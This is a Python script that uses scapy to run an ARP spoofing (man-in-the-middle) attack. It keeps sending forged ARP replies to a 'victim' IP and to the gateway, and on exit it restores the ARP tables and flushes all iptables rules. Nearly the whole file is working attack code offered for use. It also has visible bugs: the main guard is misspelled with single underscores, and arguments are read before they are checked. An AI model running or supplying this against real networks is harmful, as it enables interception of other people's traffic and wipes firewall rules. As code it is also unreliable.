#!/usr/bin/python

# This  script makes it possible to change the target mac address of your victim to your own choosing

import time
import scapy.all as scapy
import sys
import subprocess
import warnings

def get_mac_address(ip):
    if not ip:
        print("No input given. Exiting program")
        exit()

    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        return answered_list[0][1].hwsrc
    except IndexError:
        print("[-] Index out of bound exception found")

warnings.filterwarnings("ignore")

def restore(source_ip, destination_ip):
    source_mac = get_mac_address(source_ip)
    destination_mac = get_mac_address(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


if _name_ == "_main_":

    target_ip = sys.argv[1]
    gw_ip = sys.argv[2]
    packet_counter = 0
    if len(sys.argv) != 3:
        print("Usage: python3 arp_spoof.py <victim_ip> <gateway_ip>")
    try:
        while True:
            spoof(target_ip, gw_ip)
            spoof(gw_ip, target_ip)
            packet_counter = packet_counter + 2
            print("\r[+] Number of packets sent are " + str(packet_counter), end="\n")
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[-] Ctrl+C Detected!")
        print("\n[+] Restoring ARP Tables...")
        restore(target_ip, gw_ip)
        restore(gw_ip, target_ip)
        print("\n[+] Restoring Firewall rules... \n[-] Exiting...")
        time.sleep(1)
        subprocess.call(["iptables", "--flush"])
        print("[-] Restoring done!")